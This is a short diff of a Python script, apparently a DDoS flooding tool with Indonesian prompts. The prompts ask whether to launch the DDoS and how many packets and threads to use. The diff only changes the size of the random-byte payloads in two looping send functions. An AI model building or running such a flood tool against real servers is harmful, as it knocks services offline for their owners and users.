@@ -20,7 +20,7 @@ choice = str(input(" Gas Ddos Gak ni?(y/n):"))
 times = int(input(" Mau Berapa Packets?:"))
 threads = int(input(" Isi Packets Threads?:"))
 def run():
-	data = random._urandom(20000)
+	data = random._urandom(99999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -33,7 +33,7 @@ def run():
 			print("[!] FelixX!!!")
 
 def run2():
-	data = random._urandom(696969)
+	data = random._urandom(999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
